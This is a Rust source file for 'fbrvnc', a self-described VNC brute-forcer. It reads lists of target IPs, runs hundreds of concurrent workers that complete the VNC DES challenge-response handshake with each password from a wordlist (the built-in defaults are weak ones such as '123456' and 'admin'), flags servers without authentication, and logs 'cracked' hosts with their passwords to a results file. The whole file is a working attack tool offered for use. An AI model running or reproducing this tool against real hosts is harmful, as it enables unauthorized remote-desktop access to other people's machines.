use std::collections::VecDeque;
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write};
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use des::cipher::generic_array::GenericArray;
use des::cipher::{BlockEncrypt, KeyInit};
use des::Des;
use futures::stream::{self, StreamExt};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Mutex as AsyncMutex;

// ============================================================================
// Constants
// ============================================================================

const VERSION: &str = "0x204";

const DEFAULT_IPS_FILE:     &str = "IPs.txt";
const DEFAULT_RESULTS_FILE: &str = "results.txt";
const DEFAULT_TIMEOUT:      f64  = 5.0;
const DEFAULT_THREADS:      usize = 500;
const DEFAULT_PORT:         u16  = 5900;

const DEFAULT_PASSWORDS: &[&str] = &["123456", "1234", "abc", "admin"];

const DASH_W: i16 = 100;
const DASH_H: i16 = 42;
const RECENT_HITS_LIMIT: usize = 20;
const PARTIAL_TICK_MS:   u64   = 300;  // 0.3s — realtime
const FULL_TICK_SECS:    u64   = 6;    // 6s   — dọn rác / sửa dashboard

// ============================================================================
// Console abstraction (no ANSI on Windows – works on Server 2012 / older)
// ============================================================================

#[cfg(windows)]
mod con {
    use std::ffi::c_void;

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct Coord { x: i16, y: i16 }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct SmallRect { left: i16, top: i16, right: i16, bottom: i16 }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct ConsoleScreenBufferInfo {
        size: Coord,
        cursor: Coord,
        attributes: u16,
        window: SmallRect,
        max_window_size: Coord,
    }

    #[link(name = "kernel32")]
    extern "system" {
        fn GetStdHandle(n: u32) -> *mut c_void;
        fn SetConsoleCursorPosition(h: *mut c_void, p: Coord) -> i32;
        fn SetConsoleScreenBufferSize(h: *mut c_void, s: Coord) -> i32;
        fn SetConsoleWindowInfo(h: *mut c_void, a: i32, r: *const SmallRect) -> i32;
        fn GetConsoleScreenBufferInfo(h: *mut c_void, i: *mut ConsoleScreenBufferInfo) -> i32;
        fn FillConsoleOutputCharacterA(h: *mut c_void, c: i8, n: u32, p: Coord, w: *mut u32) -> i32;
        fn SetConsoleTitleA(t: *const i8) -> i32;
    }

    const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5;

    pub fn clear() {
        unsafe {
            let h = GetStdHandle(STD_OUTPUT_HANDLE);
            let mut info: ConsoleScreenBufferInfo = std::mem::zeroed();
            if GetConsoleScreenBufferInfo(h, &mut info) == 0 { return; }
            let cells = (info.size.x.max(0) as u32) * (info.size.y.max(0) as u32);
            let mut written = 0u32;
            FillConsoleOutputCharacterA(h, b' ' as i8, cells, Coord { x: 0, y: 0 }, &mut written);
            SetConsoleCursorPosition(h, Coord { x: 0, y: 0 });
        }
    }

    pub fn home() {
        unsafe {
            let h = GetStdHandle(STD_OUTPUT_HANDLE);
            SetConsoleCursorPosition(h, Coord { x: 0, y: 0 });
        }
    }

    pub fn resize(w: i16, h: i16) {
        unsafe {
            let hd = GetStdHandle(STD_OUTPUT_HANDLE);
            let mut info: ConsoleScreenBufferInfo = std::mem::zeroed();
            if GetConsoleScreenBufferInfo(hd, &mut info) == 0 { return; }

            let cur_w = info.window.right - info.window.left + 1;
            let cur_h = info.window.bottom - info.window.top + 1;
            if w < cur_w || h < cur_h {
                let tiny = SmallRect { left: 0, top: 0, right: 0, bottom: 0 };
                if SetConsoleWindowInfo(hd, 1, &tiny) == 0 { return; }
            }
            if SetConsoleScreenBufferSize(hd, Coord { x: w, y: h }) == 0 { return; }
            let full = SmallRect { left: 0, top: 0, right: w - 1, bottom: h - 1 };
            SetConsoleWindowInfo(hd, 1, &full);
        }
    }

    pub fn set_title(t: &str) {
        if let Ok(c) = std::ffi::CString::new(t) {
            unsafe { SetConsoleTitleA(c.as_ptr()); }
        }
    }
}

#[cfg(not(windows))]
mod con {
    use std::io::{self, Write};
    pub fn clear() {
        print!("\x1B[2J\x1B[H");
        io::stdout().flush().ok();
    }
    pub fn home() { print!("\x1B[H"); }
    pub fn resize(_w: i16, _h: i16) {}
    pub fn set_title(_t: &str) {}
}

// ============================================================================
// CLI
// ============================================================================

struct Cli {
    ips_file:       PathBuf,
    passwords_file: Option<PathBuf>,
    timeout:        f64,
    threads:        usize,
}

impl Cli {
    fn parse() -> Result<Self, String> {
        let mut cli = Cli {
            ips_file:       PathBuf::from(DEFAULT_IPS_FILE),
            passwords_file: None,
            timeout:        DEFAULT_TIMEOUT,
            threads:        DEFAULT_THREADS,
        };
        let mut it = std::env::args().skip(1);
        while let Some(arg) = it.next() {
            match arg.as_str() {
                "-i" | "--ip" => {
                    let v = it.next().ok_or("missing value for -i/--ip")?;
                    cli.ips_file = PathBuf::from(v);
                }
                "-p" | "--password" => {
                    let v = it.next().ok_or("missing value for -p/--password")?;
                    cli.passwords_file = Some(PathBuf::from(v));
                }
                "-t" | "--timeout" => {
                    let v = it.next().ok_or("missing value for -t/--timeout")?;
                    cli.timeout = v.parse::<f64>()
                        .map_err(|_| format!("invalid timeout: {}", v))?;
                    if cli.timeout <= 0.0 { return Err("timeout must be > 0".into()); }
                }
                "-th" | "--threads" => {
                    let v = it.next().ok_or("missing value for -th/--threads")?;
                    cli.threads = v.parse::<usize>()
                        .map_err(|_| format!("invalid threads: {}", v))?;
                    if cli.threads == 0 { return Err("threads must be > 0".into()); }
                }
                "-h" | "--help" => { print_usage(); std::process::exit(0); }
                other => return Err(format!("unknown argument: {}", other)),
            }
        }
        Ok(cli)
    }
}

fn print_usage() {
    println!("fbrvnc {}", VERSION);
    println!();
    println!("Usage: fbrvnc [options]");
    println!();
    println!("Options:");
    println!("  -i,  --ip <file>        IP list file          (default: {})", DEFAULT_IPS_FILE);
    println!("  -p,  --password <file>  Password list file    (default: built-in)");
    println!("  -t,  --timeout <sec>    Per-attempt timeout   (default: {})", DEFAULT_TIMEOUT);
    println!("  -th, --threads <n>      Concurrent workers    (default: {})", DEFAULT_THREADS);
    println!("  -h,  --help             Show this help");
    println!();
    println!("IP file format (one per line):");
    println!("    <ip>            use default port {}", DEFAULT_PORT);
    println!("    <ip>:<port>     explicit port (port 0 -> default {})", DEFAULT_PORT);
    println!("  Lines starting with '#' are ignored.");
}

// ============================================================================
// Loading
// ============================================================================

#[derive(Clone, PartialEq, Eq, Debug)]
struct Server { ip: String, port: u16 }

fn is_ip(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 4 { return false; }
    parts.iter().all(|p| {
        !p.is_empty() && p.parse::<u16>().map(|n| n <= 255).unwrap_or(false)
    })
}

fn load_servers(path: &Path, default_port: u16) -> io::Result<Vec<Server>> {
    let file = File::open(path)
        .map_err(|e| io::Error::new(e.kind(), format!("\"{}\": {}", path.display(), e)))?;
    let mut out = Vec::new();
    for line in BufReader::new(file).lines().flatten() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') { continue; }

        if line.matches(':').count() == 1 {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() == 2 && is_ip(parts[0]) {
                if let Ok(port) = parts[1].parse::<u16>() {
                    // <-- ip:0 => default port
                    let port = if port == 0 { default_port } else { port };
                    out.push(Server { ip: parts[0].into(), port });
                }
            }
        } else if is_ip(line) {
            out.push(Server { ip: line.into(), port: default_port });
        }
    }
    Ok(out)
}

fn load_passwords(path: &Path) -> io::Result<Vec<String>> {
    let file = File::open(path)
        .map_err(|e| io::Error::new(e.kind(), format!("\"{}\": {}", path.display(), e)))?;
    Ok(BufReader::new(file).lines().flatten().collect())
}

fn default_passwords() -> Vec<String> {
    DEFAULT_PASSWORDS.iter().map(|s| s.to_string()).collect()
}

// ============================================================================
// DES (VNC legacy auth)
// ============================================================================

fn make_cipher(password: &str) -> Des {
    let pb = password.as_bytes();
    let mut key = [0u8; 8];
    for (i, k) in key.iter_mut().enumerate() {
        let b = if i < pb.len() { pb[i] } else { 0 };
        *k = b.reverse_bits();
    }
    Des::new(&GenericArray::from(key))
}

// ============================================================================
// RFB auth
// ============================================================================

struct RfbResult { null: bool, name: String }

async fn rfb_attempt(
    host: &str, port: u16, cipher: &Des, timeout: Duration,
) -> Option<RfbResult> {
    let sa = format!("{}:{}", host, port).parse::<SocketAddr>().ok()?;
    let mut s = tokio::time::timeout(timeout, TcpStream::connect(sa)).await.ok()?.ok()?;
    s.set_nodelay(true).ok();

    let mut buf = [0u8; 12];
    tokio::time::timeout(timeout, s.read_exact(&mut buf)).await.ok()?.ok()?;
    if &buf[..3] != b"RFB" { return None; }
    s.write_all(b"RFB 003.003\n").await.ok()?;

    let mut m = [0u8; 4];
    tokio::time::timeout(timeout, s.read_exact(&mut m)).await.ok()?.ok()?;
    let method = u32::from_be_bytes(m);

    let (null, name) = match method {
        1 => {
            s.write_all(&[1]).await.ok()?;
            (true, read_server_name(&mut s, timeout).await?)
        }
        2 => {
            let mut ch = [0u8; 16];
            tokio::time::timeout(timeout, s.read_exact(&mut ch)).await.ok()?.ok()?;
            let mut b1 = GenericArray::clone_from_slice(&ch[..8]);
            let mut b2 = GenericArray::clone_from_slice(&ch[8..]);
            cipher.encrypt_block(&mut b1);
            cipher.encrypt_block(&mut b2);
            let mut resp = [0u8; 16];
            resp[..8].copy_from_slice(&b1);
            resp[8..].copy_from_slice(&b2);
            s.write_all(&resp).await.ok()?;

            let mut st = [0u8; 4];
            tokio::time::timeout(timeout, s.read_exact(&mut st)).await.ok()?.ok()?;
            if u32::from_be_bytes(st) != 0 { return None; }

            s.write_all(&[1]).await.ok()?;
            (false, read_server_name(&mut s, timeout).await?)
        }
        _ => return None,
    };
    Some(RfbResult { null, name })
}

async fn read_server_name(s: &mut TcpStream, timeout: Duration) -> Option<String> {
    let mut h = [0u8; 24];
    tokio::time::timeout(timeout, s.read_exact(&mut h)).await.ok()?.ok()?;
    let namelen = u32::from_be_bytes([h[20], h[21], h[22], h[23]]) as usize;
    if namelen == 0    { return Some(String::new()); }
    if namelen > 4096  { return Some("<name too long>".into()); }
    let mut name = vec![0u8; namelen];
    tokio::time::timeout(timeout, s.read_exact(&mut name)).await.ok()?.ok()?;
    Some(String::from_utf8_lossy(&name).into_owned())
}

// ============================================================================
// Result writer
// ============================================================================

struct ResultWriter { file: Mutex<File> }

impl ResultWriter {
    fn open(path: &Path) -> io::Result<Self> {
        let file = OpenOptions::new()
            .create(true).write(true).truncate(true).open(path)?;
        Ok(Self { file: Mutex::new(file) })
    }
    fn write_line(&self, line: &str) {
        let mut f = match self.file.lock() {
            Ok(g)  => g,
            Err(_) => { eprintln!("[!] result writer lock poisoned"); return; }
        };
        if let Err(e) = f.write_all(format!("{}\n", line).as_bytes()) {
            eprintln!("[!] write error: {}", e);
        }
    }
}

// ============================================================================
// Config + Dashboard state
// ============================================================================

#[derive(Clone)]
struct Config {
    threads:      usize,
    timeout:      f64,
    results_file: String,
}

#[derive(Clone)]
struct StateInner {
    total_servers:     usize,
    remaining_servers: usize,
    current_pw:        String,
    password_idx:      usize,
    password_count:    usize,
    attempts:          u64,
    start:             Instant,
    finish_time:       Option<Duration>,
    results:           VecDeque<String>,
    finished:          bool,
}

impl StateInner {
    fn new() -> Self {
        Self {
            total_servers: 0,
            remaining_servers: 0,
            current_pw: String::new(),
            password_idx: 0,
            password_count: 0,
            attempts: 0,
            start: Instant::now(),
            finish_time: None,
            results: VecDeque::with_capacity(RECENT_HITS_LIMIT),
            finished: false,
        }
    }
    fn elapsed(&self) -> Duration {
        self.finish_time.unwrap_or_else(|| self.start.elapsed())
    }
    fn cracked(&self) -> u64 {
        self.total_servers.saturating_sub(self.remaining_servers) as u64
    }
}

struct SharedState {
    inner: Mutex<StateInner>,
}

impl SharedState {
    fn new() -> Self {
        Self { inner: Mutex::new(StateInner::new()) }
    }
}

fn fmt_duration(secs: u64) -> String {
    format!("{:02}:{:02}:{:02}", secs / 3600, (secs % 3600) / 60, secs % 60)
}

// ---- dashboard build -------------------------------------------------------

fn pad_to(s: &str, w: usize) -> String {
    let n = s.chars().count();
    if n >= w {
        s.chars().take(w).collect()
    } else {
        let mut r = String::with_capacity(w);
        r.push_str(s);
        r.push_str(&" ".repeat(w - n));
        r
    }
}

// Build 15 dòng dashboard, mỗi dòng pad DASH_W
fn dashboard_lines(s: &StateInner, cfg: &Config) -> Vec<String> {
    let w = DASH_W as usize;
    let elapsed = s.elapsed();
    let secs    = elapsed.as_secs();
    let speed   = if elapsed.as_secs_f64() > 0.0 {
        s.attempts as f64 / elapsed.as_secs_f64()
    } else { 0.0 };

    let total_est = (s.total_servers as u64).saturating_mul(s.password_count as u64);
    let progress_pct = if s.finished {
        100.0
    } else if total_est > 0 {
        ((s.attempts as f64 / total_est as f64) * 100.0).min(99.99)
    } else { 0.0 };

    let pw_left = if s.password_count == 0 {
        0usize
    } else {
        s.password_count.saturating_sub(s.password_idx) + 1
    };
    let eta_attempts = (s.remaining_servers as u64).saturating_mul(pw_left as u64);
    let eta_secs = if speed > 0.0 { (eta_attempts as f64 / speed) as u64 } else { 0 };

    let pw_disp = if s.finished { s.password_count } else { s.password_idx };
    let bar_w   = 24usize;
    let filled  = ((progress_pct / 100.0) * bar_w as f64).round() as usize;
    let bar = format!(
        "{}{}",
        "=".repeat(filled.min(bar_w)),
        " ".repeat(bar_w.saturating_sub(filled))
    );

    let sep  = "=".repeat(w);
    let dash = "-".repeat(w);

    let mut v = Vec::with_capacity(15);
    v.push(sep.clone());
    v.push(pad_to(&format!(" fbrvnc {} - VNC Brute", VERSION), w));
    v.push(sep);
    v.push(pad_to(&format!(" Status     : {}",
        if s.finished { "FINISHED" } else { "RUNNING" }), w));
    v.push(pad_to(&format!(" Servers    : {} total, {} cracked, {} remaining",
        s.total_servers, s.cracked(), s.remaining_servers), w));
    v.push(pad_to(&format!(" Password   : \"{}\"  [{}/{}]",
        s.current_pw, pw_disp, s.password_count), w));
    v.push(pad_to(&format!(" Progress   : [{}] {:.2}%", bar, progress_pct), w));
    v.push(pad_to(&format!(" Attempts   : {}", s.attempts), w));
    v.push(pad_to(&format!(" Speed      : {:.1} attempts/s", speed), w));
    v.push(pad_to(&format!(" Elapsed    : {}", fmt_duration(secs)), w));
    v.push(pad_to(&format!(" ETA        : {}", fmt_duration(eta_secs)), w));
    v.push(pad_to(&format!(" Threads    : {}", cfg.threads), w));
    v.push(pad_to(&format!(" Timeout    : {:.1}s", cfg.timeout), w));
    v.push(pad_to(&format!(" Results    : {}", cfg.results_file), w));
    v.push(dash);
    v
}

// 20 hits gần nhất (mới nhất ở dưới cùng) + dòng đóng
fn hits_lines(s: &StateInner) -> Vec<String> {
    let w = DASH_W as usize;
    let mut v = Vec::with_capacity(RECENT_HITS_LIMIT + 1);
    let mut shown = 0usize;
    for line in s.results.iter().take(RECENT_HITS_LIMIT) {
        v.push(pad_to(&format!(" {}", line), w));
        shown += 1;
    }
    for _ in shown..RECENT_HITS_LIMIT {
        v.push(pad_to("", w));
    }
    v.push("=".repeat(w));
    v
}

fn emit_lines(lines: &[String]) {
    let stdout = io::stdout();
    let mut lock = stdout.lock();
    for l in lines {
        lock.write_all(l.as_bytes()).ok();
        lock.write_all(b"\r\n").ok();
    }
    lock.flush().ok();
}

// 6s / finish: xoá sạch buffer rồi vẽ lại — chống "hư dashboard"
fn render_full(s: &StateInner, cfg: &Config) {
    con::clear();
    let mut all = dashboard_lines(s, cfg);
    all.extend(hits_lines(s));
    emit_lines(&all);
}

// 0.3s: chỉ home cursor rồi ghi đè (dòng đã pad cứng → không để lại rác)
fn render_partial(s: &StateInner, cfg: &Config) {
    con::home();
    let mut all = dashboard_lines(s, cfg);
    all.extend(hits_lines(s));
    emit_lines(&all);
}

// ============================================================================
// Render loop: 0.3s partial, 6s full
// ============================================================================

async fn render_loop(
    shared:   Arc<SharedState>,
    cfg:      Arc<Config>,
    shutdown: Arc<AtomicBool>,
) {
    {
        let st = shared.inner.lock().unwrap().clone();
        render_full(&st, &cfg);
    }
    let mut last_full = Instant::now();

    let mut tick = tokio::time::interval(Duration::from_millis(PARTIAL_TICK_MS));
    tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
    tick.tick().await;

    loop {
        tick.tick().await;

        let is_shutdown = shutdown.load(Ordering::Relaxed);
        let st = shared.inner.lock().unwrap().clone();

        let need_full = is_shutdown
            || last_full.elapsed() >= Duration::from_secs(FULL_TICK_SECS);

        if need_full {
            render_full(&st, &cfg);
            last_full = Instant::now();
        } else {
            render_partial(&st, &cfg); // realtime cả dashboard + 20 hits
        }

        if is_shutdown { break; }
    }
}

// ============================================================================
// Brute engine
// ============================================================================

async fn run_brute(
    servers:   Vec<Server>,
    passwords: Vec<String>,
    writer:    Arc<ResultWriter>,
    shared:    Arc<SharedState>,
    cfg:       Arc<Config>,
) -> io::Result<()> {
    let total_servers = servers.len();
    let timeout       = Duration::from_secs_f64(cfg.timeout);
    let workers       = cfg.threads.max(1);

    // init state BEFORE spawning render loop
    {
        let mut s = shared.inner.lock().unwrap();
        s.total_servers     = total_servers;
        s.remaining_servers = total_servers;
        s.password_count    = passwords.len();
        s.start             = Instant::now();
    }

    let shutdown      = Arc::new(AtomicBool::new(false));
    let render_handle = tokio::spawn(render_loop(shared.clone(), cfg.clone(), shutdown.clone()));

    let servers_mu = Arc::new(AsyncMutex::new(servers));

    for (pw_idx, password) in passwords.iter().enumerate() {
        {
            let mut s = shared.inner.lock().unwrap();
            s.current_pw   = password.clone();
            s.password_idx = pw_idx + 1;
        }

        let snapshot: Vec<Server> = servers_mu.lock().await.clone();
        if snapshot.is_empty() { break; }

        let cipher = Arc::new(make_cipher(password));

        stream::iter(snapshot)
            .for_each_concurrent(workers, |srv| {
                let cipher = cipher.clone();
                let writer = writer.clone();
                let shared = shared.clone();
                let pw     = password.clone();

                async move {
                    let res = rfb_attempt(&srv.ip, srv.port, &cipher, timeout).await;

                    // count every attempt
                    {
                        let mut s = shared.inner.lock().unwrap();
                        s.attempts = s.attempts.wrapping_add(1);
                    }

                    if let Some(res) = res {
                        let pw_str = if res.null { "null".to_string() } else { pw };
                        let line = format!(
                            "{}:{}-{}-[{}]",
                            srv.ip, srv.port, pw_str, res.name
                        );
                        writer.write_line(&line);

                        {
                            let mut s = shared.inner.lock().unwrap();
                            s.remaining_servers = s.remaining_servers.saturating_sub(1);
                            s.results.push_back(line);
                            while s.results.len() > RECENT_HITS_LIMIT {
                                s.results.pop_front();
                            }
                        }
                    }
                }
            })
            .await;
    }

    // finished
    {
        let mut s = shared.inner.lock().unwrap();
        s.finished = true;
        s.finish_time = Some(s.start.elapsed());
    }
    shutdown.store(true, Ordering::Relaxed);
    render_handle.await.ok();

    Ok(())
}

// ============================================================================
// Entry point
// ============================================================================

fn main() {
    let cli = match Cli::parse() {
        Ok(c)  => c,
        Err(e) => {
            eprintln!("error: {}", e);
            eprintln!();
            print_usage();
            std::process::exit(1);
        }
    };

    let servers = match load_servers(&cli.ips_file, DEFAULT_PORT) {
        Ok(s)  => s,
        Err(e) => { eprintln!("error: cannot load servers: {}", e); std::process::exit(1); }
    };
    if servers.is_empty() {
        eprintln!("error: no servers loaded from \"{}\"", cli.ips_file.display());
        std::process::exit(1);
    }

    let (passwords, _pw_source) = match &cli.passwords_file {
        Some(p) => {
            let list = match load_passwords(p) {
                Ok(v)  => v,
                Err(e) => { eprintln!("error: cannot load password file: {}", e); std::process::exit(1); }
            };
            if list.is_empty() {
                eprintln!("error: password file \"{}\" is empty", p.display());
                std::process::exit(1);
            }
            (list, p.display().to_string())
        }
        None => (default_passwords(), "built-in default".to_string()),
    };

    // Console prep
    con::set_title(&format!("fbrvnc {} - VNC Brute", VERSION));
    con::resize(DASH_W, DASH_H);

    let writer = match ResultWriter::open(Path::new(DEFAULT_RESULTS_FILE)) {
        Ok(w)  => Arc::new(w),
        Err(e) => {
            eprintln!("error: cannot open \"{}\": {}", DEFAULT_RESULTS_FILE, e);
            std::process::exit(1);
        }
    };

    let shared = Arc::new(SharedState::new());
    let cfg    = Arc::new(Config {
        threads:      cli.threads,
        timeout:      cli.timeout,
        results_file: DEFAULT_RESULTS_FILE.to_string(),
    });

    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("failed to create tokio runtime");

    if let Err(e) = rt.block_on(run_brute(
        servers, passwords, writer, shared, cfg,
    )) {
        eprintln!("[!] error: {}", e);
        std::process::exit(1);
    }

    // leave the finished dashboard on screen
    println!();
    println!("Press Enter to exit...");
    let mut _buf = String::new();
    io::stdin().read_line(&mut _buf).ok();
}
